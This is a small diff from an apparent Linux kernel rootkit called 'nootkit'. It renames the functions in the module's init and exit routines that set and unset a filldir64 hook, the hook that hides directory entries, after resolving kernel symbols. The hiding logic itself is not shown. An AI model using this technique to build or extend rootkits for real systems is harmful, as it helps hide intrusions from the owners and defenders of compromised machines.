@@ -24,13 +24,13 @@ int nootkit_init(void) {
 
     resolve_ksyms((void *)kallsyms_lookup_name_addr);
 
-    hide_set_filldir64();
+    hide_hook_set_filldir64();
 
     return 0;
 }
 
 void nootkit_exit(void) {
-    hide_unset_filldir64();
+    hide_hook_unset_filldir64();
 
     printk(KERN_INFO "Unloaded nootkit!\n");
 }
